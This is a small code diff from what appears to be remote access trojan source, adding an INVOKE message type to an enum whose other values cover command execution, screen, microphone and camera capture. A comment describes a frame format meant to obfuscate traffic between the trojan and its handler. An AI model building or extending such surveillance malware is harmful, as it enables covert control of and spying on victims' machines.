@@ -16,7 +16,7 @@
 
 // custom packet send across a socket to obfuscate
 // communication between rat and handler
-enum class MsgType { INIT, EXEC, SCREEN, MIC, CAMERA, NONE };
+enum class MsgType { INIT, INVOKE, EXEC, SCREEN, MIC, CAMERA, NONE };
 class RatPacket {
 public:
     // FRAME FMT : [ 0xde 0xad | SIZE | MSG_TYPE | MSG | 0xbe 0xef ]
